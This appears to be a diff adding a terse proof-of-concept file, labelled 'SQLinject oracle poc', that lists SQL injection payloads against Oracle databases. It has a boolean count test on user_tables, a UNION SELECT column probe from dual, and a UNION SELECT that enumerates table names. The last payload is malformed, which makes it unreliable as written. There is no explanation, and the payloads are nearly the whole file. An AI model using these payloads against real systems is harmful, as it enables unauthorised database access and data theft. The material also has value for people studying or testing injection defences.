@@ -1,0 +1,10 @@
+/* csf_2015_5_8 SQLinject oracle poc */
+date=csf_2015_5_8
+name=SQLinject oracle poc
+POC:
+
+and (select count (*) from user_tables)>0--
+
+union select 1,2,3,4,5,6,7 from dual
+
+union select table_name from user_tables,2,'3','4',5,'6','7'
